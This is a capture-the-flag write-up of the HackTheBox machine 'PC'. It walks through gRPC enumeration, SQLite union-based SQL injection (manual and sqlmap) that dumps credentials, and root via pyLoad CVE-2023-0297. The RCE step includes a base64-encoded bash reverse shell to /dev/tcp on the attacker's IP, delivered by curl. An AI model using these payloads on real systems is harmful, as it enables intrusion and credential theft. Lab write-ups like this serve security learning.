---
render_with_liquid: false
title: HackTheBox Writeup  PC
date: 2023-07-17 09:18 +1400
tags: [hackthebox, nmap, linux, api, grpc, grpcurl, grpcui, burpsuite, sqlmap, sqli, sqlite, clear-text-credentials, password-reuse, tunnel, pyload, cve-2023-0297]
---



PC is an Easy Difficulty Linux machine that features a `gRPC` endpoint that is vulnerable to SQL Injection. After enumerating and dumping the database&amp;amp;#039;s contents, plaintext credentials lead to `SSH` access to the machine. Listing locally running ports reveals an outdated version of the `pyLoad` service, which is susceptible to pre-authentication Remote Code Execution (RCE) via `CVE-2023-0297`. As the service is run by `root`, exploiting this vulnerability leads to fully elevated privileges.


# Recon
---

## Nmap

> Nmap full scan will run very slow

```bash
┌──(kali㉿kali)-[~/htb/PC]
└─$ sudo nmap -p- --min-rate 10000 -Pn -vv --open 10.10.11.214
[sudo] password for kali:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-17 09:18 CST
Initiating Parallel DNS resolution of 1 host. at 09:18
Completed Parallel DNS resolution of 1 host. at 09:18, 0.01s elapsed
Initiating SYN Stealth Scan at 09:18
Scanning 10.10.11.214 [65535 ports]
Discovered open port 22/tcp on 10.10.11.214
Discovered open port 50051/tcp on 10.10.11.214
Completed SYN Stealth Scan at 09:18, 13.70s elapsed (65535 total ports)
Nmap scan report for 10.10.11.214
Host is up, received user-set (0.13s latency).
Scanned at 2023-07-17 09:18:23 CST for 13s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
50051/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds
           Raw packets sent: 131077 (5.767MB) | Rcvd: 45 (2.622KB)
```


## 50051 - Website with junk codes


### Info

![](/assets/obsidian/98fa8f0356d45d383eb915ac3d63ccb7.png)


# User Flag
---

## Enumerate GRPC

Google `port 50051`

> It's for `grpc`

Google `grpc pentest`

> https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9

Install **grpcurl**, **grpcui**

```bash
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
```

```bash
┌──(kali㉿kali)-[~/htb/PC]
└─$ grpcurl -plaintext 10.10.11.214:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection

┌──(kali㉿kali)-[~/htb/PC]
└─$ grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

Use **grpcui** to make things easier

```bash
┌──(kali㉿kali)-[~/htb/PC]
└─$ grpcui -plaintext 10.10.11.214:50051
gRPC Web UI available at http://127.0.0.1:43433/
```

Register

![](/assets/obsidian/1aa2e46e269a5fb27e80401763d764b6.png)

![](/assets/obsidian/a3f358bda5c9cb25cf85452e701ffbeb.png)

![](/assets/obsidian/3f108a7140e05dbcd77bffd2341ae7dc.png)

Login

![](/assets/obsidian/6a4eb02d634d1550d9741704537ba353.png)

![](/assets/obsidian/dd6270fcb248eae812697e6e117aa207.png)

Use `getInfo` function with the token retrieved

![](/assets/obsidian/13c7836903c7092a4c45333ce5ac62ef.png)

Returned a type error

![](/assets/obsidian/493199d27e3e803c36f31d222f7fcfa0.png)

Assuming it have SQLI


## SQL Injection (sqlite)

Send the request through burpsuite

![](/assets/obsidian/97e5ddbb127b3724ce81c7df106ae9a2.png)


### Manually

> Cheatsheet : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md


#### Enumerate number of columns from current table

**Request** 1

```bash
321 union all select NULL
```

![](/assets/obsidian/01c43985511af3145b2db043b1875b11.png)

**Request 2**

Encountered error

```bash
321 union all select NULL,NULL
```

![](/assets/obsidian/7bf6b4fae4abfc567532a69b132217d4.png)


#### Enumerate database type and version

Only `sqlite_version()` succeed, so it is `sqlite`

**Request**

```bash
321 union all select sqlite_version()
```

**Response**

```bash
3.31.1
```

![](/assets/obsidian/73f5e25d3cc96fedb7f9d29d53d3cff0.png)


#### Enumerate Tables

**Request**

```bash
321 union all select (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%')
```

**Response**

```bash
accounts,messages
```


#### Enumerate columns from `accounts`

**Request**

```bash
321 union all select (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='accounts')
```

**Response**

```bash
CREATE TABLE \"accounts\" (\n\tusername TEXT UNIQUE,\n\tpassword TEXT\n)
```


#### Dump `accounts` table

**Request**

```bash
321 union all select (SELECT group_concat(username||':'||password) FROM accounts)
```

**Response**

```bash
admin:admin,sau:HereIsYourPassWord1431
```


### With Sqlmap

Save the request to `getinfo.req` then run **sqlmap**

```bash
sqlmap -r getinfo.req -p id --level 5 --risk 3
```

![](/assets/obsidian/aaf74e1002c9f8ce156f0bd55c18fa4e.png)

```bash
sqlmap identified the following injection point(s) with a total of 184 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"timeout_seconds":5,"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYnJhdm9zZWMiLCJleHAiOjE2ODk2NzY5MTZ9.Xjjbl5fxRY8RORL5ZbuhQX9Ml-QZUwd5zVYUueIa9RI"}],"data":[{"id":"-4378 OR 7219=7219"}]}

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query - comment)
    Payload: {"timeout_seconds":5,"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYnJhdm9zZWMiLCJleHAiOjE2ODk2NzY5MTZ9.Xjjbl5fxRY8RORL5ZbuhQX9Ml-QZUwd5zVYUueIa9RI"}],"data":[{"id":"321 OR 1706=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))--"}]}

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: {"timeout_seconds":5,"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYnJhdm9zZWMiLCJleHAiOjE2ODk2NzY5MTZ9.Xjjbl5fxRY8RORL5ZbuhQX9Ml-QZUwd5zVYUueIa9RI"}],"data":[{"id":"321 UNION ALL SELECT CHAR(113,106,118,113,113)||CHAR(71,103,85,111,82,74,98,115,116,106,86,99,73,107,73,110,117,101,69,120,83,102,109,116,101,105,120,118,106,122,86,113,97,87,118,114,112,109,77,83)||CHAR(113,112,98,106,113)-- siAJ"}]}
---
[16:00:15] [INFO] the back-end DBMS is SQLite
```

Fetch tables

```bash
sqlmap -r getinfo.req -p id --level 5 --risk 3 --batch --tables
```

```bash
[16:02:55] [INFO] fetching tables for database: 'SQLite_masterdb'
<current>
[2 tables]
+----------+
| accounts |
| messages |
+----------+
```

Dump `accounts` table

```bash
sqlmap -r getinfo.req -p id --level 5 --risk 3 --batch -T accounts --dump
```

```bash
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+
```


## Login to ssh with user `sau`

```bash
┌──(kali㉿kali)-[~/htb/PC]
└─$ sshpass -p 'HereIsYourPassWord1431' ssh -o "StrictHostKeyChecking no" sau@10.10.11.214
Last login: Mon May 15 09:00:44 2023 from 10.10.14.19
sau@pc:~$ id
uid=1001(sau) gid=1001(sau) groups=1001(sau)
sau@pc:~$ cat ~/user.txt
3bc7d8d6ea3ddaf917a43a31b431f6c7
sau@pc:~$
```


# Root Flag
---

## Local Web Service

```bash
sau@pc:~$ ss -ltnp
State                    Recv-Q                   Send-Q                                     Local Address:Port                                      Peer Address:Port                  Process
LISTEN                   0                        5                                              127.0.0.1:8000                                           0.0.0.0:*
LISTEN                   0                        128                                              0.0.0.0:9666                                           0.0.0.0:*
LISTEN                   0                        4096                                       127.0.0.53%lo:53                                             0.0.0.0:*
LISTEN                   0                        128                                              0.0.0.0:22                                             0.0.0.0:*
LISTEN                   0                        4096                                                   *:50051                                                *:*
LISTEN                   0                        128                                                 [::]:22                                                [::]:*
```

port forward the `8000` port

```bash
sshpass -p 'HereIsYourPassWord1431' ssh -o "StrictHostKeyChecking no" sau@10.10.11.214 -L 8000:127.0.0.1:8000
```

![](/assets/obsidian/54c10e278d6cdf2d14e53fd4c19c16d3.png)


## pyLoad - Pre-auth RCE (CVE-2023-0297)

Google `pyload exploit`

> https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad#exploit-code

Encode reverse shell to base64

```bash
┌──(kali㉿kali)-[~/htb/PC]
└─$ echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.70/1111 0>&1 "'|base64 -w0
L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzAvMTExMSAwPiYxICIK 
```

Craft command :

```bash
echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzAvMTExMSAwPiYxICIK|base64 -d|bash
```

Url encode the command using **jq**

```bash
┌──(kali㉿kali)-[~/htb/PC]
└─$ printf %s 'echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzAvMTExMSAwPiYxICIK|base64 -d|bash'|jq -sRr @uri
echo%20L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzAvMTExMSAwPiYxICIK%7Cbase64%20-d%7Cbash
```

Execute payload

```bash
┌──(kali㉿kali)-[~/htb/PC]
└─$ curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"echo%20L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzAvMTExMSAwPiYxICIK%7Cbase64%20-d%7Cbash\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
```

```bash
┌──(kali㉿kali)-[~/scripts/www-revshell]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.70] from (UNKNOWN) [10.10.11.214] 44440
bash: cannot set terminal process group (1051): Inappropriate ioctl for device
bash: no job control in this shell
root@pc:~/.pyload/data# id
id
uid=0(root) gid=0(root) groups=0(root)
root@pc:~/.pyload/data# cat ~/root.txt
cat ~/root.txt
4f67ac252887d75c401106563eed97b6
```


# Additional
---
